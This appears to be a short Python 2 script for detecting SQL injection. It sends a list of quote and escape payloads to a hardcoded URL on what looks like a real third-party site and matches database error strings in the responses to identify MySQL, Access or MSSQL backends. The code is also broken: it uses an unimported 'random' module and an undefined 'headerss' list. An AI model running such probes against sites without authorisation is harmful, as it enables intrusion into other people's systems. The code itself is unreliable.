# -*- coding: utf-8 -*-
"""
__author__ = 'Langziyanqin'
__QQ__ = '982722261'
              ┏┓      ┏┓
            ┏┛┻━━━┛┻┓
            ┃      ☃      ┃
            ┃  ┳┛  ┗┳  ┃
            ┃      ┻      ┃
            ┗━┓      ┏━┛
                ┃      ┗━━━┓
                ┃  神兽保佑    ┣┓
                ┃　永无BUG！   ┏┛
                ┗┓┓┏━┳┓┏┛
                  ┃┫┫  ┃┫┫
                  ┗┻┛  ┗┻┛
"""
import sys
import re
import requests
reload(sys)
sys.setdefaultencoding('utf-8')
payloads = ("'", "')", "';", '"', '")', '";', '`', '`)', '`;', '\\', "%27", "%%2727", "%25%27", "%60", "%5C")
sql_errors = {'SQL syntax':'mysql','syntax to use near':'mysql','MySQLSyntaxErrorException':'mysql','valid MySQL result':'mysql',
              'Access Database Engine':'Access','JET Database Engine':'Access','Microsoft Access Driver':'Access',
            'SQLServerException':'mssql','SqlException':'mssql','SQLServer JDBC Driver':'mssql','Incorrect syntax':'mssql',
              'SELECT':'mysql','MySQL Query fail':'mysql'
         }
url = 'http://www.ahqianmo.com/category.php?id=116'
def scan_sql(url):
    for inj in payloads:
        try:
            UA = random.choice(headerss)
            headers = {'User-Agent': UA}
            r_sqlinj = requests.get(url=str(url+inj),headers=headers,timeout=5)
            for key,value in sql_errors.iteritems():
                if key in r_sqlinj.content:
                    print value
                else:
                    print 'no inj'
        except Exception,e:
            print e
